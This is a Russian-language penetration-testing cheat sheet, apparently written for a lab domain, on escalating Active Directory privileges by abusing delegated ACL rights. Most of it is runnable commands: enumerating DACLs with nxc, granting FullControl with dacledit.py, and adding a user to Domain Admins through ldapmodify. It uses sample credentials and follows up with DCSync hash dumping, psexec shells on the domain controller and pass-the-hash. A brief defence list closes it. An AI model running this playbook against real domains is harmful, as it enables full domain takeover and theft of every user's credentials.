# ACL DELEGATION — ПОВЫШЕНИЕ ПРАВ ЧЕРЕЗ ДЕЛЕГИРОВАНИЕ ПРАВ ДОСТУПА

## Что это

В AD администраторы могут делегировать права на выполнение определённых операций без назначения пользователя в Domain Admins.
Например:
- Добавлять себя в группу (Self-Membership)
- Менять пароль другого пользователя (ForceChangePassword)
- Изменять ACL (WriteDacl)
- Полный контроль над объектом (GenericAll)

В отличие от Kerberos Constrained Delegation (KCD), здесь не нужны билеты и SPN.

## Как проверить делегированные права

nxc ldap DC_IP -u USER -p PASS -M daclread -o TARGET_DN="CN=Domain Admins,CN=Users,DC=domain,DC=loc"

Пример:
nxc ldap 192.168.11.100 -u j.harris -p DropsOfJupiter2026! -M daclread -o TARGET_DN="CN=Domain Admins,CN=Users,DC=deaddrop,DC=loc"

## Что искать в выводе

Ищем строки, где Trustee (SID) — это наш пользователь.

### Ключевые Access Mask

- WriteProperty + Object type: Self-Membership → можно добавить себя в группу
- WriteDacl → можно изменять ACL (дай себе права)
- ForceChangePassword → можно сменить пароль любого пользователя
- GenericAll → полный контроль над объектом

### Пример успешного нахождения прав

ACE[9] info:
  Access mask               : WriteProperty
  Object type (GUID)        : Self-Membership (bf9679c0-0de6-11d0-a285-00aa003049e2)
  Trustee (SID)             : j.harris (S-1-5-21-...-1103)

Это значит: пользователь может добавить себя в группу Domain Admins.

## Как использовать найденные права

### Способ 1: через dacledit.py(impacket)

dacledit.py -action write -rights FullControl -principal j.harris -target-dn "CN=Domain Admins,CN=Users,DC=deaddrop,DC=loc" deaddrop.loc/j.harris:DropsOfJupiter2026!  

### Способ 2: через ldapmodify (ручной)

echo "dn: CN=Domain Admins,CN=Users,DC=domain,DC=loc" > add.ldif
echo "changetype: modify" >> add.ldif
echo "add: member" >> add.ldif
echo "member: CN=Jamie Harris,CN=Users,DC=domain,DC=loc" >> add.ldif
ldapmodify -x -H ldap://DC_IP -D "user@domain" -w "PASS" -f add.ldif

## Проверка членства после добавления

ldapsearch -x -H ldap://DC_IP -D "user@domain" -w "PASS" -b "dc=domain,dc=loc" "(sAMAccountName=USER)" memberOf

## Что делать после добавления в Domain Admins

1. DCSync — получить хэши всех пользователей
   secretsdump.py domain/user:pass@DC_IP -just-dc

2. Psexec — получить shell на DC
   psexec.py domain/user:pass@DC_IP

3. Pass-the-Hash — использовать хэш админа для движения

## Защита

- Регулярный аудит ACL в AD
- Использовать группу Protected Users
- Минимизировать делегирование прав
- Мониторить изменения в группе Domain Admins (Event ID 4728, 4732)